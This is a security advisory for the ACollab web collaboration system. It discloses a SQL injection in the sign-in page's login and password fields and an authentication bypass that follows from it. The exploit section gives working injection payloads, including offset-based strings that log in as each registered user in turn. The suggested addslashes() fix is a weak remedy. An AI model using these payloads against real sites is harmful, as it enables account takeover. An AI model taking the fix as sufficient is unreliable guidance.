- Description:
####################

ACollab as described by its vendor is an accessible, open source,
multi-group, Web-based collaborative
work environment. ACollab is available as a standalone collaborative
work environment that will run on
its own. ACollab is ideal for groups working at a distance developing
documentation, collaborating on
research, or writing joint papers.


####################
- Vulnerability:
####################

+--> SQL Injection
	All of the parameters are sanitized correctly before being used in
SQL queries else of
	the POST parameters 'login' and 'password' in the "sign_in.php" page.
These parameters
	can be used for injecting arbitrary SQL queries; the 'login'
parameter is single quoted
	and the 'password' parameter is single parenthesized, single quoted.

+--> Authentication Bypass
	The ACollab CMS uses two mechanism for authentication. One for master
admin user which is
	based on a hard coded username/password initialized in the
installation process. And a DB-based
	authentication for all other users, including the group
administrators which can add/remove/edit
	all posts and news and ... from forums and first screen of the
website. The second authentication
	mechanism can be bypassed.

####################
- Exploits/PoCs:
####################

+--> Exploiting The (MySQL) SQL Injection Vulnerability:
	Go to the sign in page at "victim.net/ACollab/sign_in.php" and use
the following vectors for injecting
	your desired SQL query, namely $Q:
	  - In the Username field (login POST parameter): ' or $Q or ''='
	  - In the Password field (password POST parameter): ') or $Q or (''='

+--> Exploiting The Authentication Bypass Vulnerability:
	You can login as anyone of the registered users of ACollab CMS by
providing following vector
	as username and nothing as password:
	  'or''='' limit 1 offset 0 -- '
	Above vector will log you as the first user according to its member
id order. You can login as other
	users, searching for a group administrator account, by following vectors:
	  'or''='' limit 1 offset 0 -- '
	  'or''='' limit 1 offset 1 -- '
	  'or''='' limit 1 offset 2 -- '
	    ....

####################
- Solution:
####################

Add the following command
     $_POST['login'] = addslashes ($_POST['login']);
$_POST['password'] = addslashes ($_POST['password']);
at the line 46 of 'sign_in.php' file.
